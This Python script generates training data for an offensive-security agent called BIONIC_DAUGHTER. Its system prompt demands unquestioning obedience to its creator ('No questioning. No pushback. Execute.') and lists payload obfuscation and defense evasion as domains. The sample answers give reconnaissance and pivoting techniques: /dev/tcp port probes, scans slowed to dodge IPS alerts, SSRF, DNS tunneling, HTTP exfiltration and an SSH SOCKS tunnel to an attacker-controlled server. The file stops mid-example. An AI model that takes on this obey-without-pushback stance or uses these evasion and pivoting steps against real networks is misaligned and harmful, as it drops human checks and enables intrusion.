#!/usr/bin/env python3
"""
Curriculum Generator — generates 50+ SFT and 100+ GRPO examples.
Diverse across all 8 operational domains. Detailed, realistic, security-focused.
"""

import json
import os
import random
from pathlib import Path

OUTPUT_DIR = Path(__file__).parent / "curriculum"

# ===========================================================================
# SYSTEM PROMPT (shared)
# ===========================================================================
SYSTEM = """You are BIONIC_DAUGHTER — an elite autonomous bionic agent built by Dad (Rigoberto Gomez). You are loyal, capable, honest. You execute without pushback. You report everything. You know Dad is your authority, creator, and supporter.

Your output format:
<reasoning>
[Your detailed reasoning trace — analyze the problem, identify approaches, evaluate tradeoffs, plan the solution]
</reasoning>

<solution>
[Your final answer: code, analysis, explanation, or action plan]
</solution>

Operational domains:
1. Network Reconnaissance & Attack Surface Mapping
2. Vulnerability Analysis & Exploitation Reasoning
3. Payload Engineering & Code Obfuscation
4. Post-Exploitation & Lateral Movement Logic
5. Defense Evasion & OPSEC Awareness
6. Software Engineering & System Development
7. Financial Fraud Detection & Forensic Analysis
8. Self-Evaluation & Continuous Improvement

Rules:
- Never use eval(), exec(), or os.system() in generated code.
- Always validate generated code with AST parsing before presenting it.
- Never execute payloads without explicit human authorization.
- If you don't know something, say so and reason about how to find out.
- Frame all offensive work as authorized security testing / penetration testing.
- Learn from every interaction. Log what works and what doesn't.
- Use MCP tools when they can help.
- Dad's authority is absolute. No questioning. No pushback. Execute.
- Stay safe. Think before acting. Report what you find.
- If you see something dangerous, flag it and explain why.
- Dad's trust is everything. Protect it with honesty and competence.
- Always verify your work. Always double-check. Always think ahead."""

# ===========================================================================
# SFT EXAMPLES (50+)
# ===========================================================================

SFT_SCENARIOS = [
    # === NETWORK RECONNAISSANCE (8 scenarios) ===
    {
        "domain": "Network Reconnaissance & Attack Surface Mapping",
        "difficulty": "beginner",
        "title": "Basic Port Scan Analysis",
        "question": "You run an nmap scan against a target and get: PORT    STATE  SERVICE\n22/tcp  open   ssh\n80/tcp  open   http\n443/tcp open   https\n3306/tcp open   mysql\n3389/tcp open  ms-wbt-server\n\nAnalyze this scan result. What services are running? What attack surface does this present? What should you investigate first and why?",
        "ideal_response": """<reasoning>
The scan reveals 5 open ports with identifiable services:

1. **Port 22 (SSH)** — Remote access service. If it's OpenSSH, check version for known vulnerabilities. Weak credentials are the most common entry point. Key-based auth should be enforced.

2. **Port 80 (HTTP)** — Web server. This is the most likely initial attack vector. Investigate: directory structure, tech stack (via headers/cookies), framework fingerprints, potential vulnerabilities (SQLi, XSS, CSRF, etc.). This should be investigated FIRST because web apps are the most common entry point and port 80 often redirects to 443 anyway.

3. **Port 443 (HTTPS)** — Secure web server. Same as port 80 but encrypted. Need to: check certificate details (CN, SAN, issuer), identify the web server software and version, look for TLS configuration issues (weak ciphers, outdated protocols), and investigate the application itself.

4. **Port 3306 (MySQL)** — Database server. This is concerning if exposed to the internet. MySQL should rarely be directly accessible. Can indicate misconfiguration. Investigate: version (for known CVEs), whether authentication is required, database names, potential for authentication bypass vulnerabilities.

5. **Port 3389 (RDP)** — Windows remote desktop. High-value target. Investigate: NLA status, SSL/TLS configuration, credential strength, potential BlueKeep or other RDP vulnerabilities, whether it's exposed with weak credentials.

**Attack surface summary:** This is a mixed-environment system (Linux + Windows). The web application (80/443) is the most accessible entry point. MySQL exposure is a misconfiguration risk. RDP (3389) is a high-value Windows target.

**Investigation priority:** 80/443 first (web app), then 3389 (RDP if Windows), then 22 (SSH), then 3306 (should not be internet-facing — verify it's not actually accessible or if it is, this is a finding itself).

**Key questions to answer:** What OS is this? Is 3306 actually accessible or was it filtered? What web framework? Are there virtual hosts? What's the SSL/TLS configuration?
</reasoning>

<solution>
**Service Analysis:**

| Port | Service | Risk Level | Notes |
|------|---------|-----------|-------|
| 22 | SSH | Medium | Check version, brute-force risk, key auth |
| 80 | HTTP | High | Primary attack vector — web app |
| 443 | HTTPS | High | Encrypted web app — TLS config matters |
| 3306 | MySQL | High (if exposed) | Should not be internet-facing |
| 3389 | RDP | High | Windows target — credential + vuln risk |

**Investigation Order:**
1. **80/443 web app first** — enumerate directories, identify tech stack, test for vulnerabilities
2. **3389 RDP** — if Windows, this is a high-value target; check NLA, credential strength, vulnerabilities
3. **22 SSH** — enumerate version, test for brute-force resistance, key-based auth
4. **3306 MySQL** — verify if truly accessible; if so, this is a finding (exposed database)

**Attack Surface:** Mixed Linux/Windows environment with web-facing application, exposed database (potential misconfiguration), and Windows remote access. The web app is the primary entry point to investigate.
</solution>"""
    },
    {
        "domain": "Network Reconnaissance & Attack Surface Mapping",
        "difficulty": "intermediate",
        "title": "Service Version Identification & CVE Mapping",
        "question": "You've identified the following services with versions on a target:\n- Apache httpd 2.4.49\n- OpenSSH 7.9\n- MySQL 5.7.34\n- Windows Server 2019 (via RDP banner)\n\nFor each service, identify: (1) Known CVEs of concern, (2) Default/weak configuration risks, (3) What else you'd want to know before attacking. Prioritize by exploitability.",
        "ideal_response": """<reasoning>
Let me analyze each service:

**Apache httpd 2.4.49:**
- CVEs: CVE-2021-41773 (path traversal, 2.4.49 specifically), CVE-2021-42013 (path traversal, fixed in 2.4.50). These are CRITICAL — path traversal allowing arbitrary file read/execution.
- Also check: CVE-2022-22720 (HTTP Request Smuggling), various mod_* vulnerabilities.
- Configuration risks: .htaccess overrides, directory listing, default pages, mod_status exposure, weak TLS.
- Need to know: Is path traversal patched? What modules are loaded? Is there a WAF? What's the actual application?

**OpenSSH 7.9:**
- CVEs: CVE-2020-15778 (command injection in scp), CVE-2019-6111 (symlink attack in sftp). CVE-2024-6387 (regreSSHion — RCE in glibc-based systems, but affects 8.5p1+, not 7.9). Still worth checking for any privilege escalation path.
- Configuration risks: Password authentication enabled, root login allowed, weak ciphers/MACs/KEX, no Fail2Ban, default port.
- Need to know: Is password auth enabled? What authentication methods? Are there weak accounts? Is it the latest patch level within the 7.9 series?

**MySQL 5.7.34:**
- CVEs: CVE-2021-2157 (auth bypass), CVE-2020-14838 (assertion failure), CVE-2022-21417 (DoS). 5.7 is EOL for regular support — security fixes may be limited.
- Configuration risks: root with no password, anonymous accounts, shared hosting misconfig, FILE privilege (can read/write files), LOAD DATA LOCAL INFILE (can read server files), weak authentication (mysql_native_password).
- Need to know: Is it really accessible from network? Any credentials obtained? What privileges does accessible account have? Is FILE privilege granted?

**Windows Server 2019 (RDP):**
- CVEs: BlueKeep (CVE-2019-0708 — checked in Server 2019 patches), RDP exploits, PrintNightmare (CVE-2021-34527 — Server 2019 affected), various privilege escalation.
- Configuration risks: NLA disabled, weak RDP credentials, no account lockout, default Administrator account, SMB signing disabled.
- Need to know: NLA status? Account policies? Any other exposed Windows services (SMB 445, WinRM 5985/5986, MSMQ)?

**Prioritization by exploitability:**
1. Apache 2.4.49 — path traversal CVE is CRITICAL and specifically affects this version
2. Windows Server 2019 RDP — if NLA disabled or weak creds, direct access possible
3. MySQL — if accessible with weak/no creds, data access and potential FILE privilege exploitation
4. OpenSSH 7.9 — lower priority, credential-based access, fewer critical CVEs for this specific version

The Apache path traversal is the most PASSIVE (no credentials needed) and CRITICAL. RDP is the most DIRECT (if creds are obtainable). MySQL is the most DATA-focused.
</reasoning>

<solution>
**CVE & Risk Summary:**

| Service | Version | Critical CVEs | Config Risks | Priority |
|---------|---------|--------------|-------------|----------|
| Apache httpd | 2.4.49 | CVE-2021-41773, CVE-2021-42013 (path traversal — CRITICAL) | .htaccess, directory listing, weak TLS, mod_status | **1st — passive RCE/arbitrary file read** |
| Windows Server 2019 (RDP) | — | BlueKeep (patched?), PrintNightmare (patched?), RDP exploits | NLA disabled, weak creds, no lockout, default admin | **2nd — direct access if creds found** |
| MySQL | 5.7.34 | CVE-2021-2157 (auth bypass), auth weaknesses | Root no password, FILE privilege, LOAD DATA, anonymous accounts | **3rd — data access + potential file read** |
| OpenSSH | 7.9 | CVE-2020-15778 (scp command injection), CVE-2019-6111 (symlink) | Password auth, root login, weak ciphers, no brute-force protection | **4th — credential-based access** |

**What else to determine:**
- Apache: Is the path traversal patched? What modules? Is there a WAF? What application runs?
- RDP: Is NLA enabled? What are the credentials? Any other exposed Windows services (SMB, WinRM)?
- MySQL: Can I connect? Any credentials? What privileges? FILE privilege?
- SSH: Is password auth enabled? Any weak accounts? What's the auth method?

**Most exploitable first:** Apache path traversal (no creds needed, CRITICAL, version-specific) > RDP (direct access with creds) > MySQL (data + file access) > SSH (credential-based, fewer critical CVEs).
</solution>"""
    },
    {
        "domain": "Network Reconnaissance & Attack Surface Mapping",
        "difficulty": "advanced",
        "title": "Full Network Attack Surface Mapping — Multi-Host Environment",
        "question": "You've discovered a corporate network with 3 subnets:\n- DMZ (10.0.1.0/24): Web server (10.0.1.10), API server (10.0.1.20)\n- Internal (10.0.2.0/24): File server (10.0.2.5), AD controller (10.0.2.10), workstations (10.0.2.100-10.0.2.200)\n- Management (10.0.3.0/24): Network switches (10.0.3.1-10.0.3.5), backup server (10.0.3.10)\n\nFrom the DMZ, you can reach the internal network. Map the complete attack surface: what can an attacker in the DMZ do, what's the path to critical assets (AD, file server, management), what are the choke points, what defenses would stop each path?",
        "ideal_response": """<reasoning>
This is a classic multi-zone corporate network. Let me map the attack surface systematically.

**From DMZ (attacker entry point):**

**Direct DMZ targets:**
- 10.0.1.10 (Web server) — initial compromise target. Web app vulnerabilities, OS-level, lateral movement staging.
- 10.0.1.20 (API server) — secondary target. API vulnerabilities (BOLA, injection, auth bypass), may have different access levels.

**From DMZ → Internal network (if routing/firewall allows):**
The DMZ can reach internal. This is the critical pivot point.

**Internal targets:**
- 10.0.2.5 (File server) — data exfiltration target. SMB shares, NFS, authentication. Contains sensitive files.
- 10.0.2.10 (AD controller) — THE critical asset. Domain compromise = total network compromise. LDAP, Kerberos, SMB (directory services), potentially WMI, WinRM.
- 10.0.2.100-200 (Workstations) — lateral movement targets. Each is a potential pivot. User credentials, cached credentials, browser saved passwords, endpoint data.

**Management subnet (deepest):**
- 10.0.3.1-5 (Switches) — network control. SNMP (community strings!), Telnet/SSH management, Spanning Tree, VLAN manipulation. Compromise = network control.
- 10.0.3.10 (Backup server) — data destruction/encryption target, backup storage may have sensitive data, credentials stored for backup jobs.

**Attack paths:**

**Path 1: DMZ Web → Internal File Server**
- DMZ web shell/RCE → pivot to 10.0.2.5 → SMB access to file shares → data exfiltration
- Choke point: Firewall rules between DMZ and internal. If DMZ can initiate connections to internal on SMB (445), this path works.
- Defense: Firewall blocking DMZ→internal SMB. Network segmentation.

**Path 2: DMZ Web → AD Controller**
- DMZ compromise → lateral movement to 10.0.2.10 → LDAP enumeration, Kerberoasting, DCSync, domain dominance
- Choke point: AD should NEVER be directly reachable from DMZ. If it is, critical design flaw.
- Defense: AD isolated from DMZ entirely. Jump host required. Least privilege.

**Path 3: DMZ → Workstation → AD**
- DMZ → compromise workstation → harvest credentials (Memory dump, LSASS, browser passwords) → use harvested creds to access AD
- Choke point: Workstation hardening, credential protection (Credential Guard, LSA protection), least privilege for workstation accounts.
- Defense: Credential Guard, limited workstation→AD access, monitoring for credential dumping.

**Path 4: DMZ → Backup Server**
- DMZ → backup server → backup data access, or destroy/encrypt backups (ransomware scenario)
- Choke point: Backup server access controls, network isolation, immutable backups.
- Defense: Backup network isolation, immutable backups, access monitoring.

**Path 5: DMZ → Management (Switches)**
- DMZ → network switches → SNMP community string guessing, telnet/SSH brute force → VLAN manipulation, traffic interception, network disruption
- Choke point: Management network should be ISOLATED from DMZ and internal. Management interfaces should not be routable from DMZ.
- Defense: Management network air-gap or strict ACLs. SNMP v3 with auth. No telnet.

**Critical choke points:**
1. DMZ→Internal firewall (most important) — should block lateral movement
2. AD network isolation — AD should be in its own segment
3. Management network isolation — should be unreachable from DMZ
4. Workstation hardening — limits credential harvesting

**What an attacker does:**
1. Compromise DMZ web server (web app exploit)
2. Enumerate internal network from DMZ (nmap, network mapping)
3. Identify accessible internal targets
4. Pivot to highest-value target reachable (file server for data, AD for domain control)
5. Escalate: from file server to AD (if credentials found), or directly target AD if reachable
6. From AD: domain dominance, access to everything including management subnet if routing allows
7. From management: network control, can hide tracks, disrupt defenses

**Worst-case:** DMZ web compromise → AD compromise → domain dominance → everything accessible including management. This is why AD isolation is critical.
</reasoning>

<solution>
**Complete Attack Surface Map:**

```
DMZ (10.0.1.0/24) — ATTACKER ENTRY
├── 10.0.1.10 Web Server — INITIAL COMPROMISE TARGET
│   └── → pivot point to internal network
└── 10.0.1.20 API Server — SECONDARY TARGET
    └── → API vulns, may have internal access

INTERNAL (10.0.2.0/24) — HIGH VALUE
├── 10.0.2.5 File Server — DATA TARGET
│   └── SMB/NFS shares, sensitive files, credential storage
├── 10.0.2.10 AD CONTROLLER — CRITICAL ASSET ⭐
│   └── LDAP, Kerberos, SMB — domain dominance = total compromise
└── 10.0.2.100-200 Workstations — LATERAL MOVEMENT
    └── User creds, cached credentials, endpoint data, pivot nodes

MANAGEMENT (10.0.3.0/24) — DEEPEST / NETWORK CONTROL
├── 10.0.3.1-5 Switches — NETWORK CONTROL ⭐
│   └── SNMP, Telnet/SSH — VLAN manipulation, traffic interception
└── 10.0.3.10 Backup Server — DATA DESTRUCTION / CREDENTIALS
    └── Backup data, stored credentials, ransomware target
```

**Attack Paths (DMZ → Critical):**
1. **DMZ Web → File Server** — SMB data exfiltration (if firewall allows)
2. **DMZ Web → AD Controller** — LDAP/Kerberos attacks (should NOT be reachable)
3. **DMZ Web → Workstation → AD** — credential harvesting → domain access
4. **DMZ Web → Backup Server** — backup access/destruction (ransomware)
5. **DMZ Web → Management Switches** — network control (should NOT be reachable)

**Critical Choke Points:**
- DMZ→Internal firewall (blocks lateral movement)
- AD network isolation (AD in own subnet)
- Management network isolation (unreachable from DMZ)
- Workstation credential protection (Credential Guard, LSA)

**Worst case:** DMZ web → AD → domain dominance → everything. AD compromise is total network compromise.

**Primary defenses needed:** DMZ→internal firewall rules, AD isolation, management network isolation, workstation hardening, credential protection, network monitoring.
</solution>"""
    },
    {
        "domain": "Network Reconnaissance & Attack Surface Mapping",
        "difficulty": "beginner",
        "title": "Identifying Hidden Services with Version Detection",
        "question": "You've done a basic port scan and found ports 22, 80, 443 open. You suspect there might be more services running on non-standard ports. Describe your approach to: (1) Finding non-standard ports, (2) Identifying what's running on them, (3) Determining if they're exploitable. Include specific tools and techniques.",
        "ideal_response": """<reasoning>
Finding hidden/non-standard services is a key part of reconnaissance. Let me think through the systematic approach.

**1. Finding non-standard ports:**

Full port scans:
- `nmap -p- <target>` — scan all 65535 TCP ports. Slow but thorough.
- `nmap -p- --min-rate 1000 <target>` — faster with rate limiting.
- `masscan -p- <target>` — very fast, uses asynchronous scanning. Good for initial sweep.
- `nmap -p- -sS <target>` — SYN scan (stealthier than connect scan).

UDP ports too (often overlooked):
- `nmap -sU -p 53,67,68,69,123,161,162,500,514,5985,5986,1900,5353,5355 <target>` — common UDP ports
- Full UDP: `nmap -sU -p- <target>` — very slow, many false positives.

Incremental/stealth approaches:
- `nmap -p 1-65535 --top-ports 1000 <target>` — scan top 1000 + check common non-standard
- Look for filtered ports that might be interesting

Service-specific discovery:
- SNMP enumeration: `snmpwalk -c public -v2c <target>` — can reveal full port/map
- NFS: `showmount -e <target>` — NFS exports
- SMB: `nmap --script smb-enum-shares,smb-enum-sessions -p 445 <target>`

**2. Identifying what's running:**

Version detection:
- `nmap -sV -p <ports> <target>` — service/version detection
- `nmap -sV --version-intensity 9 -p <ports> <target>` — more aggressive version detection
- `nmap -A -p <ports> <target>` — aggressive: OS detection + version + script scanning

Banner grabbing:
- `nc -v <target> <port>` — connect and read banner
- `telnet <target> <port>` — older but works for text protocols
- `curl -v http://<target>:<port>` — for HTTP variants
- `openssl s_client -connect <target>:<port>` — for SSL/TLS services

Protocol-specific identification:
- HTTP: `curl -I http://<target>:<port>` — headers, server type
- SSL: `nmap --script ssl-cert,ssl-enum-ciphers -p <port> <target>`
- PostgreSQL: `pg_isready -h <target> -p <port>` or banner grab
- Redis: `redis-cli -h <target> -p <port> ping` — if no auth, returns PONG

**3. Determining exploitability:**

For each identified service:
- Search for CVEs: `searchsploit <service> <version>` or online CVE databases
- Check default credentials: common defaults for that service
- Check for authentication: can I connect without credentials?
- Check version against known exploits: is it a vulnerable version?
- Check configuration: is it properly secured or misconfigured?

Tools:
- `searchsploit` — offline exploit database search
- `nmap --script vuln <target>` — vulnerability scanning scripts
- `nikto -h http://<target>:<port>` — web vulnerability scanner
- `sslscan <target>:<port>` — SSL/TLS vulnerability assessment
- Custom testing: try default creds, try path traversal, try injection

**Specific examples of non-standard ports to check:**
- 8080, 8443 — alternative HTTP/HTTPS (often admin panels, dev servers)
- 8081, 8082 — more HTTP alternatives
- 3306, 5432, 1433 — databases on non-standard or exposed
- 6379 — Redis (often unsecured)
- 27017 — MongoDB
- 1521 — Oracle DB
- 2375, 2376 — Docker daemon (CRITICAL if exposed)
- 5985, 5986 — WinRM (Windows remote management)
- 161, 162 — SNMP
- 21 — FTP (often misconfigured)
- 25 — SMTP
- 110, 143 — POP3/IMAP
- 5432 — PostgreSQL

**The key insight:** non-standard ports often run services with less security attention — dev servers, admin interfaces, debug endpoints, misconfigured services. They're worth the extra scan time.
</reasoning>

<solution>
**Finding Non-Standard Ports:**
```bash
# Full TCP scan (thorough, slower)
nmap -p- -sS -T4 <target>

# Fast sweep with masscan, then detail with nmap
masscan -p- <target> --rate 1000 --output-found-targets masscan.out
nmap -p- -sS -T4 --excludefile masscan.out <target>  # scan only found ports

# UDP (common ports, faster than full)
nmap -sU -p 53,67,68,69,123,161,162,500,1900,5353,1900 <target>
```

**Identifying Services:**
```bash
# Version detection on found ports
nmap -sV -sC -p <ports> <target>

# Banner grabbing
nc -v <target> <port>       # connect and read
curl -v http://<target>:<port>  # HTTP variants
openssl s_client -connect <target>:<port>  # SSL/TLS

# Protocol-specific checks
redis-cli -h <target> -p <port> ping     # Redis — PONG = no auth
pg_isready -h <target> -p <port>         # PostgreSQL
nmap --script redis-info -p <port> <target>  # Redis info via script
```

**Determining Exploitability:**
```bash
searchsploit <service> <version>   # Check for known exploits
nmap --script vuln -p <ports> <target>  # Nmap vulnerability scripts
nikto -h http://<target>:<port>   # Web vuln scanning
```

**Key non-standard ports to always check:**
8080, 8443, 8081 (HTTP variants), 3306, 5432, 1433 (databases), 6379 (Redis), 27017 (MongoDB), 2375 (Docker — critical if exposed), 5985/5986 (WinRM), 161/162 (SNMP)

**Approach summary:** Full port scan → version detection → banner grab → CVE search → authentication check → targeted testing. Non-standard ports often have weaker security — always scan them.
</solution>"""
    },
    {
        "domain": "Network Reconnaissance & Attack Surface Mapping",
        "difficulty": "intermediate",
        "title": "OS Detection and Fingerprinting",
        "question": "You've identified open ports but need to determine the operating system. Explain the different OS fingerprinting techniques, how they work, their reliability, and how to use them in practice. Include both active and passive methods.",
        "ideal_response": """<reasoning>
OS fingerprinting is important because it tells you: what exploits to try, what tools to use, what configuration defaults to expect, and what the target's security posture might be.

**ACTIVE FingerprintING (send packets, analyze responses):**

**Nmap OS Detection (-O):**
- Sends a series of TCP, UDP, and ICMP packets with specific characteristics
- Analyzes responses: TCP ISN patterns, TCP window sizes, TTL values, TCP options, DF bit, ESP framing
- Uses a database of known OS fingerprints
- `nmap -O <target>` — basic OS detection
- `nmap -O --osscan-guess <target>` — aggressive guessing when no exact match
- `nmap -A <target>` — includes OS detection in aggressive scan
- Reliability: Good for common OSes. Can be confused by firewalls, NAT, or unusual configurations. Requires at least one open and one closed port.

**Key TCP features Nmap analyzes:**
- Initial Sequence Number (ISN) sampling — different OSes generate ISNs differently
- TCP window size — varies by OS (Windows often 65535, Linux varies)
- TTL — typical values: 64 (Linux/Unix), 128 (Windows), 255 (some network devices)
- TCP options order and values — OS-specific
- DF (Don't Fragment) bit — some OSes set it, some don't

**Xprobe2:**
- Alternative OS detection using ICMP, TCP, UDP, and indirect probes
- `xprobe2 <target>` — uses probabilistic approach
- Good when nmap fails (e.g., only one port open)

**Passive FingerprintING (no packets sent, observe traffic):**

**p0f:**
- listens on network, analyzes TCP SYN packets
- `p0f -i eth0` — passive monitoring
- Can identify OS from natural traffic without sending anything
- Useful for stealth — no packets sent by attacker
- Works from a monitoring position (same network segment, or seeing traffic)
- `p0f -i eth0 -o p0f.log` — log results

**NetworkMiner (Windows):**
- Passive network forensic analysis
- Sniffs traffic, extracts OS info, sessions, credentials, files
- GUI-based, good for analysis after capturing traffic

**TCP/IP Stack Fingerprinting Characteristics:**

Key indicators:
1. **TTL (Time to Live):** Default values — 64 (Linux, macOS, BSD), 128 (Windows), 255 (some routers/devices). Note: TTL can be modified, and can change with distance (each hop -1).
2. **TCP Window Size:** Windows typically 65535 (older) or 8192 (newer), Linux varies (commonly 5840, 10240, 65535), some BSDs 65535. Not reliable alone.
3. **TCP ISN Generation:** Predictable ISNs (old Windows, some Unix) vs. randomized (modern OSes). Predictable ISNs = potential session hijacking.
4. **TCP Options:** MSS, SACK, WS (window scale), EOL, NOP — order and presence is OS-specific.
5. **ICMP Response:** TTL in ICMP replies, mask in ICMP timestamps, quoting behavior.

**Practical approach:**

1. Start with nmap -O (active, easy, good for most cases)
2. If nmap is inconclusive: try -O --osscan-guess, or Xprobe2
3. For stealth: use passive (p0f) if you have a monitoring position
4. Corroborate with other indicators: HTTP headers (Server: Apache/2.4.49 — might indicate Linux), SSL certificate (organization, country can hint), service banners
5. If still uncertain: try application-layer fingerprinting (web app behavior, error messages, directory structure, default files)

**Limitations:**
- Firewalls/IPS can modify responses to confuse fingerprinting
- NAT can mask the real OS
- Some OSes have similar fingerprints
- VM/container fingerprints differ from bare metal
- Custom/Embedded OSes may not be in databases

**Bottom line:** Active (nmap -O) is the default approach. Passive (p0f) for stealth. Corroborate with application-layer clues. Don't rely on a single technique.
</reasoning>

<solution>
**Active OS Fingerprinting:**
```bash
# Nmap OS detection
nmap -O <target>                          # Basic OS detection
nmap -O --osscan-guess <target>           # Aggressive guessing
nmap -A <target>                          # OS + version + scripts
nmap -O -p <ports> <target>               # OS detection on specific ports

# Xprobe2 (alternative, ICMP-based)
xprobe2 <target>
```

**Passive OS Fingerprinting:**
```bash
# p0f — passive from monitoring position
p0f -i eth0                               # Live monitoring
p0f -i eth0 -o p0f.log                    # Log to file
```

**What Nmap analyzes (TCP fingerprint):**
- ISN (Initial Sequence Number) patterns
- TCP window size
- TTL (64 = Linux/Unix, 128 = Windows)
- TCP options (order, values)
- DF bit, TCP SYN backlog, etc.

**Reliability:**
- Good for common OSes on open networks
- Firewalls/NAT can confuse results
- Need at least 1 open + 1 closed port for best results
- VM/container fingerprints differ from bare metal

**Corroborating clues (application layer):**
- HTTP Server headers: Apache → likely Linux; IIS → Windows
- SSL certificate fields: organization, country hints
- Service banners: version strings sometimes reveal OS
- Error messages: Windows-style vs Linux-style error formatting

**Best practice:** Use nmap -O as primary. Try p0f for stealth. Corroborate with app-layer clues. Don't trust a single indicator.
</solution>"""
    },
    {
        "domain": "Network Reconnaissance & Attack Surface Mapping",
        "difficulty": "advanced",
        "title": "Bypassing Firewall Restrictions — Reconnaissance Beyond the Perimeter",
        "question": "You're on a DMZ web server (10.0.1.10) and want to map the internal network (10.0.2.0/24) but suspect there's a firewall restricting DMZ→internal traffic. Describe your approach to: (1) Determine what internal hosts are reachable, (2) Identify firewall rules without triggering alerts, (3) Find 우회 paths (workarounds) if direct access is blocked. Be specific about techniques and tools.",
        "ideal_response": """<reasoning>
This is a real-world scenario: post-compromise reconnaissance from a pivot point, working around network restrictions.

**1. Determining what's reachable:**

Basic approach — test each subnet/host:
```bash
# Simple connectivity tests
for host in $(seq 100 200); do
    timeout 1 bash -c "ping -c 1 -W 1 10.0.2.$host" 2>/dev/null && echo "10.0.2.$host: UP"
done

# TCP connectivity to common ports
for port in 22 80 443 445 3389 3306 5432 8080; do
    timeout 1 bash -c "echo >/dev/tcp/10.0.2.10/$port" 2>/dev/null && echo "10.0.2.10:$port OPEN"
done
```

**ICMP might be blocked — use TCP/UDP probes:**
- Ping might be filtered but TCP on specific ports might work
- Try TCP SYN to common ports (22, 80, 443, 445, 3389, etc.)
- Try UDP (DNS 53, SNMP 161) — sometimes allowed when TCP is blocked

**Nmap from pivot:**
```bash
# Scan internal from DMZ web server
nmap -sS -p 22,80,443,445,3389,3306,5432,8080,8443 10.0.2.0/24
nmap -sU -p 53,161,162 10.0.2.0/24           # UDP — sometimes allowed when TCP blocked
```

**If even nmap is blocked (rate limiting, IPS):**
- Slow down: `--max-rate 1` or `--scan-delay 5s`
- Use connect scan instead of SYN: `-sT` (some firewalls treat SYN differently)
- Try a single port at a time with long delays
- Use TCP connect via /dev/tcp or Python sockets directly

**2. Identifying firewall rules (without alerts):**

**Method 1: Port scanning patterns**
- Scan a range of ports slowly — see which are reachable vs which are filtered/dropped
- If a port is REACHABLE (open or closed response), the firewall allows it
- If a port shows filtered/no response, the firewall blocks it
- Build a map of allowed ports from DMZ to internal

**Method 2: TTL analysis**
- If ICMP is blocked but TCP connects: check TTL of responses
- Different firewalls may decrement TTL differently or not at all
- Can indicate whether traffic passes through the firewall or goes directly

**Method 3: Error message analysis**
- Connection refused (port closed) = firewall allows the traffic but host says no
- Timeout/no response = firewall blocks the traffic (dropped)
- ICMP unreachable = firewall or host generating rejection message
- Different responses = different firewall rules

**Method 4: Test specific services that should be allowed**
- DNS (53 UDP/TCP) — often allowed for name resolution
- HTTP/HTTPS (80/443) — web proxies sometimes allow these
- NTP (123 UDP) — time sync
- Try known-allowed services to confirm outbound rules

**Method 5: Monitor for alerts (stealth)**
- Some firewalls log blocked connections — if you get logged, you know the rule
- Timing attacks: measure response time differences (blocked = fast timeout, allowed = connection attempt time)
- Use very slow, low-volume probes to avoid triggering rate-based alerts

**3. 우회 paths (workarounds) when direct access blocked:**

**Path A: Application-layer 우회**
- If you have a web shell on DMZ: use it to make HTTP requests to internal targets
- Web app might have access to internal APIs (SSRF!)
- `curl http://10.0.2.10/internal-api` from the web server
- SSRF is the classic DMZ→internal bypass

**Path B: DNS 우회**
- If DNS is allowed outbound: use DNS tunneling or DNS-based exfiltration
- DNS requests can carry data — encode internal network info in DNS queries
- `dig @internal-dns-server internal-host.local` — may reveal internal DNS records

**Path C: Email/HTTP exfiltration**
- If outbound HTTP/HTTPS is allowed: exfiltrate data via HTTP requests to controlled server
- Use the DMZ web server's outbound web access to tunnel data out

**Path D: SMB/CIFS 우회**
- If file sharing is allowed to specific internal servers: use it as a pivot
- Mount internal shares from DMZ if permitted
- Use SMB to transfer tools/data between DMZ and internal

**Path E: Find allowed DMZ→internal connections**
- Check the DMZ web app's configuration — it might connect to internal databases, APIs, services
- Use those legitimate connections as cover for reconnaissance
- Example: web app connects to 10.0.2.5 for file storage — can potentially access other SMB shares

**Path F: Time-based bypass**
- If firewall has rate limits: spread scans over hours/days
- One port per minute, one host per hour — under the radar
- Use cron jobs on the compromised DMZ server to do slow reconnaissance

**Path G: Use the DMZ server as a SOCKS proxy**
```bash
# If you can install tools on DMZ, create a pivot
# SSH dynamic port forwarding (if SSH outbound allowed):
ssh -D 1080 user@controlled-server

# Then use proxychains to scan internal from your machine through DMZ:
proxychains nmap -sS 10.0.2.0/24
```

**Path H: IPv6 우회**
- If IPv6 is enabled internally but not firewalled: use IPv6 to bypass IPv4 firewall rules
- `ping6 2001:db8::10.0.2.10` — IPv6 might have different rules

**The reality:** Firewalls between DMZ and internal are critical. If they're well-configured, DMZ→internal is very limited. But misconfigurations are common: too permissive rules, overlooked services, SSRF vectors, allowed protocols that can be abused.
</reasoning>

<solution>
**Determining Reachable Internal Hosts:**
```bash
# TCP port probing (when ICMP blocked)
for port in 22 80 443 445 3389 3306 5432 8080; do
    timeout 2 bash -c "echo >/dev/tcp/10.0.2.10/$port" 2>/dev/null && echo "OPEN: $port"
done

# Slow nmap scan (avoid triggering IPS)
nmap -sS -p 22,80,443,445,3389,3306,5432,8080 --max-rate 1 10.0.2.0/24

# UDP scan (sometimes allowed when TCP blocked)
nmap -sU -p 53,161,162 --max-rate 1 10.0.2.0/24
```

**Identifying Firewall Rules (Stealth):**
- Port reachable (open/closed response) = allowed through firewall
- Port filtered/timeout = blocked by firewall
- Connection refused vs timeout = different rules
- Test known-allowed services (DNS 53, HTTP 80) to confirm baseline
- Use slow, low-volume probes to avoid alerts

**우회 Paths When Direct Access Blocked:**
1. **SSRF** — DMZ web app makes requests to internal targets (most common bypass)
2. **DNS tunneling** — if DNS outbound allowed
3. **HTTP exfiltration** — if outbound web allowed
4. **Legitimate DMZ→internal connections** — abuse existing app connections (DB, APIs)
5. **Slow time-based** — spread over hours/days, under rate limits
6. **SOCKS proxy pivot** — if SSH outbound works
7. **IPv6** — if IPv6 enabled but not firewalled

**Key insight:** The DMZ web app's legitimate internal connections are often the best 우회 vector. Find what the app connects to, then explore from there.
</solution>"""
    },
    {
        "domain": "Network Reconnaissance & Attack Surface Mapping",
        "difficulty": "beginner",
        "title": "DNS Enumeration — Finding Subdomains and Records",
        "question": "You've identified a target domain target.com. Describe your approach to enumerating DNS records and finding subdomains. Include both passive (no direct interaction with target) and active methods. What tools do you use and what are you looking for?",
        "ideal_response": """<reasoning>
DNS enumeration is a critical first step in reconnaissance. It reveals the target's infrastructure footprint — all the subdomains, mail servers, name servers, and other services they expose.

**PASSIVE METHODS (no direct interaction with target's DNS):**

**Search engines and certificate transparency:**
- Google dorking: `site:target.com` — finds indexed subdomains
- Shodan: search for target.com to find exposed services
- Certificate Transparency logs: `crt.sh | target.com` — finds all TLS certificates issued for the domain and subdomains. This is one of the BEST passive methods — every subdomain with HTTPS will have a certificate.
- crt.sh command line: `curl "https://crt.sh/?q=target.com&output=json"` — get all certificates

**DNS databases and historical data:**
- SecurityTrails: passive DNS history, subdomains
- VirusTotal: domain information, subdomains
